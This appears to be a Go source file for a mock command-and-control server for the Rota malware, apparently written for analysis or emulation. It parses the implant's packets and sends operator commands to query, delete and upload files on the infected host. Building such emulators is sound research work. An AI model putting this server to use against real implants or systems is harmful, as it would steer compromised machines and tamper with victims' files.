package main

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"net"

	"github.com/GoRota/pkt"
)

func err_check(err error, msg string) {
	if err != nil {
		fmt.Errorf(msg)
		panic(err)
	}
}

/**
*
 */
func handleRequest(conn net.Conn) {
	log.Println("Accepted new connection.")
	defer conn.Close()
	defer log.Println("Closed connection.")

	for {
		buf := make([]byte, 1024)
		size, err := conn.Read(buf)
		if err != nil {
			return
		}
		data := buf[:size]
		log.Println("Read new data from connection", hex.EncodeToString(data))

		isRota := pkt.VerifyItsALotus(data)
		if isRota {
			fmt.Println("Rota pkt identified!")

			// parse cmd_id
			cmd_id := make([]byte, 2)
			copy(cmd_id, data[14:])
			fmt.Println("CMD ID is: " + hex.EncodeToString(cmd_id))

			if bytes.Equal(cmd_id, pkt.Rota_c2_heartbeat) {
				fmt.Println("[PKT-ID] Heartbeat pkt identified!")

			} else if bytes.Equal(cmd_id, pkt.Rota_c2_exit) {
				fmt.Println("[PKT-ID] Exit pkt identified!")
			} else if bytes.Equal(cmd_id, pkt.Rota_c2_test) {
				fmt.Println("[PKT-ID] Test pkt identified!")
			} else if bytes.Equal(cmd_id, pkt.Rota_c2_steal_data) {
				fmt.Println("[PKT-ID] Steal data pkt identified!")
			} else if bytes.Equal(cmd_id, pkt.Rota_c2_upload_dev_info) {
				fmt.Println("[PKT-ID] Upload dev pkt identified!")
			} else if bytes.Equal(cmd_id, pkt.Rota_c2_upload_file) {
				fmt.Println("[PKT-ID] Upload file pkt identified!")
			} else if bytes.Equal(cmd_id, pkt.Rota_c2_query_file) {
				fmt.Println("[PKT-ID] Query file pkt identified!")
			} else if bytes.Equal(cmd_id, pkt.Rota_c2_delete_file) {
				fmt.Println("[PKT-ID] Delete filie pkt identified!")
			} else if bytes.Equal(cmd_id, pkt.Rota_c2_run_plugin) {
				fmt.Println("[PKT-ID] Run SO plugin pkt identified!")
			}

			// create response
			initialHdr := pkt.CreateLotusHeader()

			var usrCmd string
			fmt.Print("[operator]> ")
			usrCmd = "uploadFile"
			//fmt.Scan(&usrCmd)
			//usrCmd = "heartbeat"

			switch usrCmd {
			case "heartbeat":
				// Setting heart beat
				fmt.Println("Sending Heartbeat...")
				copy(initialHdr[14:], []byte{0x5c, 0xca, 0x72, 0x07})
				conn.Write(initialHdr)

			case "exit":
				// Setting heart beat
				fmt.Println("Sending exit...")
				copy(initialHdr[14:], []byte{0x13, 0x8e, 0x3e, 0x06})
				conn.Write(initialHdr)
				conn.Close()

			case "timeout":
				// Setting heart beat
				fmt.Println("Sending timeout...")
				copy(initialHdr[14:], []byte{0x17,0xB1, 0xCC, 0x04})
				// setting length to 1 byte
				copy(initialHdr[4:], []byte{0x01, 0x00, 0x00, 0x00})

				// create new array of 83 bytes.
				// copy over 82 bytes of header, and then 1 byte of sleep time
				full_pkt := make([]byte, 83)
				copy(full_pkt, initialHdr)
				copy(full_pkt[82:], []byte{0x0e})

				conn.Write(full_pkt)

			case "queryfile":
				fmt.Println("Sending query file...")
				var fpath = "/etc/hosts"
				fpath_len := uint32(len(fpath)) // get legnth
				fpath_barray := make([]byte, 4) // make byte array
				// Create 4 byte array containing file size of
				binary.LittleEndian.PutUint32(fpath_barray, fpath_len) // copy  hex length value into fpath_barray

				// cmd id
				copy(initialHdr[14:], []byte{0x2C, 0xD9, 0x07, 0x00})
				// size of payload (4 bytes)
				copy(initialHdr[4:], fpath_barray)

				// copy over 82 bytes of header, and then the payload
				new_size := 82 + len(fpath)
				full_pkt := make([]byte, new_size)
				copy(full_pkt, initialHdr)
				copy(full_pkt[82:], fpath)
				conn.Write(full_pkt)

			case "deletefile":
				fmt.Println("Sending delete file...")
				// note,
				var fpath = "/etc/doesNotExist"
				fpath_len := uint32(len(fpath))
				fpath_barray := make([]byte, 4)

				// Create 4 byte array containing file size of
				binary.LittleEndian.PutUint32(fpath_barray, fpath_len)

				// cmd id for delete file
				copy(initialHdr[14:], []byte{0x12, 0xB3, 0x62, 0x09})

				// setting length to length of file path
				copy(initialHdr[4:], fpath_barray)

				// create new array 82 bytes + file length;
				//new_size := 82 + len(fpath)
				new_size := 82 + fpath_len
				full_pkt := make([]byte, new_size)
				copy(full_pkt, initialHdr) // copy 82 bytes
				copy(full_pkt[82:], fpath) // copy fpath
				conn.Write(full_pkt)

			case "uploadFile":
				fmt.Println("Sending upload file...")
				var data = "This is data that's getting uploaded to a file"
				data_len := uint32(len(data))
				data_barray := make([]byte, 4)

				// Create 4 byte array containing file size of
				binary.LittleEndian.PutUint32(data_barray, data_len)

				// cmd id for delete file
				copy(initialHdr[14:], []byte{0x2E, 0x25, 0x99, 0x02})

				// setting length to length of file path
				copy(initialHdr[4:], data_barray)

				// create new array 82 bytes + file length;
				//new_size := 82 + len(fpath)
				new_size := 82 + data_len
				full_pkt := make([]byte, new_size)
				copy(full_pkt, initialHdr) // copy 82 bytes
				copy(full_pkt[82:], data)  // copy fpath
				conn.Write(full_pkt)

			default:
				fmt.Println("Command does not exist!")
				conn.Write(initialHdr)
			}

		} else {
			// returning data
			fmt.Println("Rota pkt not recieved. Echoing data back to client!")
			conn.Write(data)
		}
	}
}

func toByteArray(i int) (arr [4]byte) {
	binary.BigEndian.PutUint32(arr[0:4], uint32(i))
	return
}

func main() {

	fmt.Println("Mock-Rota C2")

	addr := "10.10.2.228:1443"
	server, err := net.Listen("tcp", addr)
	msg := "error listening on " + addr
	err_check(err, msg)

	defer server.Close()

	for {
		conn, err := server.Accept()
		msg := "error accepting connections"
		err_check(err, msg)
		go handleRequest(conn)
	}
}
